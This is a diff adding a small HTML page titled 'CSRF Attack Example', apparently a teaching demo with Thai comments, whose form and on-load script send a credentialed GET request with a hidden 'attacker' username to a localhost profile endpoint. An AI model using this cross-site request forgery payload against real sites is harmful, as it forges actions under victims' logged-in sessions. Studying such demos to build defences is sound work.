@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Example</title>
+</head>
+<body>
+    <h1>CSRF Attack Example</h1>
+
+    <form action="http://localhost:4000/profile" method="GET">
+        <input type="hidden" name="username" value="attacker">
+        <input type="submit" value="Submit Form">
+    </form>
+
+    <script>
+        // ส่งคำขอไปยัง server โดยใช้ XMLHttpRequest (สามารถใช้ Fetch API ได้เช่นกัน)
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "http://localhost:4000/profile", true);
+        xhr.withCredentials = true;  // ต้องส่ง cookies ไปด้วย
+        xhr.send();
+    </script>
+</body>
+</html>
